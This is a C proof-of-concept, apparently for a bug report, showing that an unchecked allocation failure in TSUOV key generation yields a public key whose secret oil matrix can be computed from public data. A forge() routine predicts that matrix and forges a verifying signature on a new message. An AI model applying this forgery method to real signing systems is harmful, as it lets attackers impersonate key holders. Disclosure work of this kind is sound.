/* sign-31-8: a failed oil-matrix expansion in TSUOV key generation builds the
 * public key from a secret that is computable from public data.
 *
 * TSUOV_KeyGen (tsuov_core.c:840-859) calls Expand_S, which fills the stack
 * buffer r2 through RejSampPRG_sm3; that ignores pseudoXOF's status
 * (tsuov_core.c:409-411), TSUOV_KeyGen is void and sig_keygen returns 0. If
 * pseudoXOF's allocation fails, the oil matrix is decoded from whatever r2's
 * stack slot holds. In these builds that is the public Pi1 expansion (index
 * m1-1) of the PREVIOUS key's seed_pk after an earlier keygen, or zeros in a
 * fresh process at TSUOV-256/512. P3 is then computed from that matrix, so the
 * published key is consistent with an oil matrix anyone can compute.
 *
 * Linked with -Wl,--wrap=malloc -Wl,--wrap=pseudoXOF. The pseudoXOF wrapper
 * (a) when armed, makes pseudoXOF's own first malloc fail for the first
 * Pi2-sized request (Expand_S), and (b) in the attacker's forging step only,
 * returns the attacker's predicted stale bytes in place of Expand_sk's
 * expansion of a dummy seed, so the attacker runs the unmodified TSUOV_Sign.
 *
 * Mode "prev": keygen pk1; keygen pk2 with the fault; the attacker predicts
 * the stale bytes from pk1 alone and forges on m3 under pk2. Mode "fresh":
 * the faulted keygen is the first call; the attacker predicts zeros. Each
 * mode also shows the legitimate holder's own signature failing under pk2,
 * and a control keygen without the fault. Prints the results. */
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "SIG_AlgorithmInstance.h"
#include "tsuov_core.h"
#include "drng.h"

int sig_keygen(unsigned char *, unsigned long long *, unsigned char *, unsigned long long *);
int sig_sign(unsigned char *, unsigned long long, unsigned char *, unsigned long long,
             unsigned char *, unsigned long long *);
int sig_verify(unsigned char *, unsigned long long, unsigned char *, unsigned long long,
               unsigned char *, unsigned long long);
MGF_CTX_s *PRG_copy_sm3(MGF_CTX_s *src);
void RejSampPRG_sm3(MGF_CTX_s *ctx, const uint64_t index, const unsigned int length,
                    const unsigned int tau, uint8_t *dst);

DRNG_ctx drng_algorithm;
void *__real_malloc(size_t);
int __real_pseudoXOF(unsigned long long, const unsigned char *, unsigned long long, unsigned char *);

static int fail_next, arm_keygen, inject;
static uint8_t inj_bytes[TSUOV_Pi2_RS_LEN];
static TSUOV_SEED dummy_seed;

void *__wrap_malloc(size_t n)
{
    if (fail_next) { fail_next = 0; return NULL; }
    return __real_malloc(n);
}

int __wrap_pseudoXOF(unsigned long long outbits, const unsigned char *msg,
                     unsigned long long inbits, unsigned char *out)
{
    int pi2 = outbits == (unsigned long long)TSUOV_Pi2_RS_LEN * 8 &&
              inbits == (unsigned long long)(TSUOV_SEED_LEN + 2) * 8;
    if (arm_keygen && pi2) { arm_keygen = 0; fail_next = 1; }
    if (inject && pi2 && memcmp(msg, dummy_seed, TSUOV_SEED_LEN) == 0) {
        memcpy(out, inj_bytes, TSUOV_Pi2_RS_LEN);
        return 0;
    }
    return __real_pseudoXOF(outbits, msg, inbits, out);
}

static unsigned char pk1[CRYPTO_PUBLICKEYBYTES], pk2[CRYPTO_PUBLICKEYBYTES], sk[CRYPTO_SECRETKEYBYTES];
static unsigned char sn[CRYPTO_BYTES];

/* attacker: predicted stale bytes, then sign m3 under pk2 and verify */
static int forge(const unsigned char *prev_pk, const unsigned char *m3)
{
    static uint8_t r1[TSUOV_Pi1_LEN];
    static TSUOV_SIGNATURE_s s3;
    TSUOV_SEED seed_pk, sv, sr, ss;
    size_t pb = 0;
    if (prev_pk) {
        pb = 0; restore_TSUOV_SEED(prev_pk, &pb, seed_pk);
        MGF_CTX_s *c0 = PRG_init_sm3(seed_pk), *c1 = PRG_copy_sm3(c0);
        RejSampPRG_sm3(c1, 2 * (TSUOV_m1 - 1), TSUOV_Pi1_LEN, TSUOV_Pi1_RS_LEN, r1);
        PRG_final_sm3(c1); PRG_final_sm3(c0);
        memcpy(inj_bytes, r1, TSUOV_Pi2_RS_LEN);
    } else {
        memset(inj_bytes, 0, sizeof inj_bytes);
    }
    pb = 0; restore_TSUOV_SEED(pk2, &pb, seed_pk);
    memset(dummy_seed, 0xEE, sizeof dummy_seed);
    for (int i = 0; i < TSUOV_SEED_LEN; i++) { sv[i] = (uint8_t)(i + 1); sr[i] = (uint8_t)(i + 2); ss[i] = (uint8_t)(i + 3); }
    inject = 1;
    TSUOV_Sign(dummy_seed, seed_pk, sv, sr, ss, m3, 32, &s3);
    inject = 0;
    memset(sn, 0, sizeof sn);
    pb = 0; store_TSUOV_SIGNATURE(&s3, sn, &pb);
    return sig_verify(pk2, CRYPTO_PUBLICKEYBYTES, sn, CRYPTO_BYTES, (unsigned char *)m3, 32) == 0;
}

int main(int argc, char **argv)
{
    int fresh = argc > 1 && !strcmp(argv[1], "fresh");
    int ctl = argc > 2 && !strcmp(argv[2], "control");
    unsigned long long pkl, skl, l;
    unsigned char seed[48], m[32], m3[32];
    for (int i = 0; i < 48; i++) seed[i] = (uint8_t)(5 * i + 3);
    for (int i = 0; i < 32; i++) { m[i] = (uint8_t)i; m3[i] = (uint8_t)(i ^ 0xa7); }
    init_random_number(&drng_algorithm, seed, 48);

    if (!fresh && sig_keygen(pk1, &pkl, sk, &skl)) return 1;     /* pk1 is public */
    arm_keygen = !ctl;
    int rc = sig_keygen(pk2, &pkl, sk, &skl);
    arm_keygen = 0;
    int own = (sig_sign(sk, skl, m, 32, sn, &l) == 0) && sig_verify(pk2, pkl, sn, l, m, 32) == 0;
    int forged = forge(fresh ? NULL : pk1, m3);
    printf("%s%s: keygen=%d holder-signature-verifies=%d attacker-forgery(m3)-verifies=%d\n",
           fresh ? "fresh" : "prev", ctl ? " control" : "", rc, own, forged);
    return 0;
}
